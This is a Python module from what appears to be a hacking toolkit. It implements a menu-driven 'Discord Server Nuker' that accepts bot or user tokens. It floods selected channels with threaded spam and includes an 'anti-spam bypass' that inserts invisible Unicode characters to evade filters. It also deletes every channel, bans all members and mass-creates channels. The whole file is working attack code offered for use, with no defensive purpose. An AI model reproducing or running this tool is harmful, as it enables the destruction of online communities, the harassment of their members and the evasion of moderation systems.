from tools.base import *

DISCORD_API = "https://discord.com/api/v10"
BOT_UA = "DiscordBot (python urllib)"
INVISIBLES = ["\u200B", "\u200C", "\u200D", "\uFEFF", "\u2060", "\u2061", "\u2062", "\u2063", "\u2064"]
_lock = threading.Lock()

def _auth(token, es_bot):
    t = token.strip()
    if t.startswith("Bot "):
        return t
    return f"Bot {t}" if es_bot else t

def _req(token, es_bot, method, endpoint, data=None):
    auth = _auth(token, es_bot)
    headers = {"Authorization": auth, "User-Agent": BOT_UA, "Content-Type": "application/json"}
    url = f"{DISCORD_API}{endpoint}"
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            resp = r.read().decode()
            return json.loads(resp) if resp else {}, r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        return {"error": body}, e.code

def _bypass(msg):
    return "".join(c + random.choice(INVISIBLES) * random.randint(0, 2) for c in msg)

def _build_payload(mensaje, usar_embed, titulo, desc, color, footer, img_url):
    if usar_embed:
        e = {"title": titulo or mensaje[:256], "description": desc or mensaje, "color": color, "timestamp": datetime.utcnow().isoformat()}
        if footer:
            e["footer"] = {"text": footer}
        if img_url:
            e["image"] = {"url": img_url}
        return {"embeds": [e]}
    return {"content": mensaje}

def _spam_channel(token, es_bot, ch_id, ch_name, payload, veces, stats):
    for _ in range(veces):
        try:
            _req(token, es_bot, "POST", f"/channels/{ch_id}/messages", payload)
            with _lock:
                stats["ok"] += 1
                total = stats["ok"] + stats["err"]
                print(f"  [{R2}{total:>4}{RS}/{stats['total']}] {R1}OK{RS} -> #{ch_name}")
        except urllib.error.HTTPError as e:
            if e.code == 429:
                retry = int(e.headers.get("Retry-After", e.headers.get("X-RateLimit-Reset-After", 1)))
                print(f"  {D}[!] Rate limit #{ch_name}, esperando {retry}s...{RS}")
                time.sleep(retry + 0.5)
                try:
                    _req(token, es_bot, "POST", f"/channels/{ch_id}/messages", payload)
                    with _lock:
                        stats["ok"] += 1
                        total = stats["ok"] + stats["err"]
                        print(f"  [{total:>4}/{stats['total']}] {R1}OK{RS} -> #{ch_name} (retry)")
                except:
                    with _lock:
                        stats["err"] += 1
                        total = stats["ok"] + stats["err"]
                        print(f"  [{total:>4}/{stats['total']}] {D}ERR{RS} -> #{ch_name}")
            else:
                with _lock:
                    stats["err"] += 1
                    total = stats["ok"] + stats["err"]
                    print(f"  [{total:>4}/{stats['total']}] {D}HTTP {e.code}{RS} -> #{ch_name}")
        except Exception as e:
            with _lock:
                stats["err"] += 1
                total = stats["ok"] + stats["err"]
                print(f"  [{total:>4}/{stats['total']}] {D}ERR: {str(e)[:30]}{RS} -> #{ch_name}")
        with _lock:
            barra_progreso(stats["ok"] + stats["err"], stats["total"], prefijo="Nuke")

def nuke_spam(token, es_bot, channels, mensaje, veces, hilos=5, usar_embed=False, titulo="", desc="", color=0xFF0000, footer="", img_url="", bypass=False):
    payload = _build_payload(_bypass(mensaje) if bypass else mensaje, usar_embed, titulo, desc, color, footer, img_url)
    stats = {"ok": 0, "err": 0, "total": len(channels) * veces}
    hilos = min(hilos, len(channels))
    hilos = max(hilos, 1)
    batch = []
    for ch in channels:
        t = threading.Thread(target=_spam_channel, args=(token, es_bot, ch["id"], ch["name"], payload, veces, stats), daemon=True)
        batch.append(t)
        t.start()
        if len(batch) >= hilos:
            for t in batch:
                t.join()
            batch = []
    for t in batch:
        t.join()
    return stats["ok"], stats["err"]

def nuke_delete_channels(token, es_bot, channels):
    count = 0
    for ch in channels:
        try:
            _req(token, es_bot, "DELETE", f"/channels/{ch['id']}")
            count += 1
            print(f"  {R1}[+] Deleted: #{ch['name']}{RS}")
        except Exception as e:
            print(f"  {D}[!] Error deleting #{ch['name']}: {str(e)[:40]}{RS}")
    return count

def nuke_ban_all(token, es_bot, guild_id):
    count = 0
    miembros = []
    try:
        miembros, _ = _req(token, es_bot, "GET", f"/guilds/{guild_id}/members?limit=1000")
    except urllib.error.HTTPError as e:
        if e.code == 403:
            print(f"  {D}[!] No permission to list members (missing intent GUILD_MEMBERS){RS}")
        else:
            print(f"  {D}[!] HTTP {e.code} al listar miembros{RS}")
        return 0
    except Exception as e:
        print(f"  {D}[!] Error getting members: {e}{RS}")
        return 0
    for m in miembros:
        uid = m["user"]["id"]
        uname = f"{m['user']['username']}#{m['user'].get('discriminator', '0')}"
        try:
            _req(token, es_bot, "PUT", f"/guilds/{guild_id}/bans/{uid}", {"delete_message_days": 1})
            count += 1
            print(f"  {R1}[+] Banned: {uname}{RS}")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                print(f"  {D}[!] No permission to ban: {uname}{RS}")
            else:
                print(f"  {D}[!] Error banning {uname}: HTTP {e.code}{RS}")
        except Exception as e:
            print(f"  {D}[!] Error banning {uname}: {str(e)[:40]}{RS}")
    return count

def nuke_create_channels(token, es_bot, guild_id, nombre, cantidad):
    count = 0
    for i in range(cantidad):
        try:
            _req(token, es_bot, "POST", f"/guilds/{guild_id}/channels", {"name": f"{nombre}-{i+1}", "type": 0})
            count += 1
            print(f"  {R1}[+] Channel created: {nombre}-{i+1}{RS}")
        except Exception as e:
            print(f"  {D}[!] Error creating channel {i+1}: {str(e)[:40]}{RS}")
    return count

def menu_nuke():
    while True:
        try:
            limpiar(); print_banner()
            barra_menu("DISCORD - SERVER NUKER")
            print()
            menu_en_columnas([
                ("1","Multi-Channel Spam"),
                ("2","Delete Channels"),
                ("3","Ban All"),
                ("4","Create Channels"),
                ("",""),
                ("0","Back"),
            ])
            print()
            op = input(f"  {R2}>>{RS} ").strip().lower()

            if op == "0":
                return
            elif op == "h":
                show_help()
                continue
            elif op == "x":
                sys.exit(0)

            token = input(f"\n  {R2}Token{RS} > ").strip()
            if not token:
                continue

            tipo = input(f"  {R2}Is bot? (y/N){RS} > ").strip().lower()
            es_bot = tipo == "y"

            print(f"\n  {D}[+] Obteniendo informacion del token...{RS}")

            if es_bot:
                try:
                    info, status = _req(token, es_bot, "GET", "/users/@me")
                    if status != 200:
                        print(f"  {D}[!] Invalid bot token (HTTP {status}){RS}")
                        pausa()
                        continue
                    print(f"  {R1}[+] Bot connected: {info.get('username', '?')} (ID: {info.get('id', '?')}){RS}")
                    guild_id = input(f"\n  {R2}Server ID (Guild ID){RS} > ").strip()
                    if not guild_id:
                        continue
                    guild_name = guild_id
                    print(f"\n  {D}[+] Verifying...{RS}")
                    g_info, g_status = _req(token, es_bot, "GET", f"/guilds/{guild_id}")
                    if g_status == 200:
                        print(f"  {R1}[+] Bot in server: {g_info.get('name', '?')}{RS}")
                    elif g_status == 403:
                        print(f"  {D}[!] Bot is NOT in that server or missing scope{RS}")
                        print(f"  {D}Invite: https://discord.com/api/oauth2/authorize?client_id={info.get('id', '?')}&permissions=8&scope=bot{RS}")
                        pausa()
                        continue
                    else:
                        print(f"  {D}[!] Error HTTP {g_status}{RS}")
                        pausa()
                        continue
                except Exception as e:
                    print(f"  {D}[!] Invalid bot token: {e}{RS}")
                    pausa()
                    continue
            else:
                try:
                    guilds_data = _req(token, es_bot, "GET", "/users/@me/guilds")
                    if isinstance(guilds_data, tuple):
                        guilds, status = guilds_data
                    else:
                        guilds, status = guilds_data, 200
                    if status != 200 or not guilds:
                        print(f"  {D}[!] Invalid token or no servers{RS}")
                        pausa()
                        continue
                    print(f"\n  {R2}{'':<4} {'ID':<20} {'NAME'}{RS}")
                    print(f"  {'─' * 56}")
                    for i, g in enumerate(guilds):
                        print(f"  {W}{i+1:>2}.{RS} {g['id']:<20} {g['name']}")
                    choice = input(f"\n  {R2}Select server (num or ID){RS} > ").strip()
                    try:
                        idx = int(choice) - 1
                        guild_id = guilds[idx]["id"]
                        guild_name = guilds[idx]["name"]
                    except (ValueError, IndexError):
                        guild_id = choice
                        guild_name = choice
                except Exception as e:
                    print(f"  {D}[!] Error: {e}{RS}")
                    pausa()
                    continue

            print(f"  {D}[+] Getting channels...{RS}")
            try:
                channels, _ = _req(token, es_bot, "GET", f"/guilds/{guild_id}/channels")
            except Exception as e:
                print(f"  {D}[!] Error getting channels: {e}{RS}")
                pausa()
                continue

            text_channels = [c for c in channels if c.get("type") in (0, 5)]

            def seleccionar_canales(lista, mensaje="choose"):
                if not lista:
                    print(f"  {D}[!] No channels available{RS}")
                    return []
                print(f"\n  {R2}{'':<4} {'CHANNEL':<25} {'ID'}{RS}")
                print(f"  {'─' * 56}")
                for i, c in enumerate(lista):
                    print(f"  {W}{i+1:>2}.{RS} #{c['name']:<23} {c['id']}")
                sel = input(f"\n  {R2}Channels to {mensaje} (eg: 1,3,5-8 or 'all'){RS} > ").strip().lower()
                if sel == "all":
                    return list(lista)
                indices = set()
                for parte in sel.split(","):
                    parte = parte.strip()
                    if not parte:
                        continue
                    if "-" in parte:
                        try:
                            a, b = map(int, parte.split("-"))
                            indices.update(range(a - 1, b))
                        except:
                            pass
                    else:
                        try:
                            indices.add(int(parte) - 1)
                        except:
                            pass
                return [lista[i] for i in indices if 0 <= i < len(lista)]

            if op == "1":
                if not text_channels:
                    print(f"  {D}[!] No text channels{RS}")
                    pausa()
                    continue
                selected = seleccionar_canales(text_channels, "nuke")
                if not selected:
                    pausa()
                    continue
                print(f"  {R1}[+] {len(selected)}/{len(text_channels)} channels selected{RS}")

                mensaje = input(f"\n  {R2}Message to send{RS} > ").strip()
                if not mensaje:
                    continue

                usar_embed = input(f"  {R2}Use Embed? (y/N){RS} > ").strip().lower() == "y"
                titulo = desc = footer = img_url = ""
                color = 0xFF0000
                if usar_embed:
                    titulo = input(f"  {R2}Embed title{RS} > ").strip()
                    desc = input(f"  {R2}Description{RS} > ").strip()
                    try:
                        color = int(input(f"  {R2}Hex color (eg: FF0000){RS} > ").strip() or "FF0000", 16)
                    except:
                        color = 0xFF0000
                    footer = input(f"  {R2}Footer{RS} > ").strip()
                    img_url = input(f"  {R2}Image URL (optional){RS} > ").strip()

                usar_bypass = input(f"  {R2}Anti-spam bypass? (y/N){RS} > ").strip().lower() == "y"

                try:
                    veces = int(input(f"  {R2}Times per channel{RS} > ").strip())
                    if veces < 1:
                        veces = 1
                except:
                    veces = 1

                try:
                    hilos = int(input(f"  {R2}Simultaneous threads (1-20) [5]{RS} > ").strip() or "5")
                    if hilos < 1:
                        hilos = 1
                    if hilos > 20:
                        hilos = 20
                except:
                    hilos = 5

                print(f"\n  {D}[!] Nuking {len(selected)} channels x {veces} times ({hilos} threads)...{RS}\n")
                ok, err = nuke_spam(token, es_bot, selected, mensaje, veces, hilos, usar_embed, titulo, desc, color, footer, img_url, usar_bypass)
                print(f"\n  {R1}[+] Done: {ok} sent, {err} errors{RS}")

            elif op == "2":
                print(f"  {R1}[+] {len(channels)} channels found{RS}")
                conf = input(f"\n  {D}Delete ALL channels? (y/N){RS} > ").strip().lower()
                if conf == "y":
                    print()
                    ok = nuke_delete_channels(token, es_bot, channels)
                    print(f"\n  {R1}[+] {ok} channels deleted{RS}")

            elif op == "3":
                print(f"  {D}[+] Getting members...{RS}")
                ok = nuke_ban_all(token, es_bot, guild_id)
                print(f"\n  {R1}[+] {ok} members banned{RS}")

            elif op == "4":
                nombre = input(f"\n  {R2}Base channel name{RS} > ").strip()
                if not nombre:
                    continue
                try:
                    cantidad = int(input(f"  {R2}Amount{RS} > ").strip())
                    if cantidad < 1 or cantidad > 100:
                        cantidad = 10
                except:
                    cantidad = 10
                print()
                ok = nuke_create_channels(token, es_bot, guild_id, nombre, cantidad)
                print(f"\n  {R1}[+] {ok} channels created{RS}")

            pausa()

        except KeyboardInterrupt:
            return
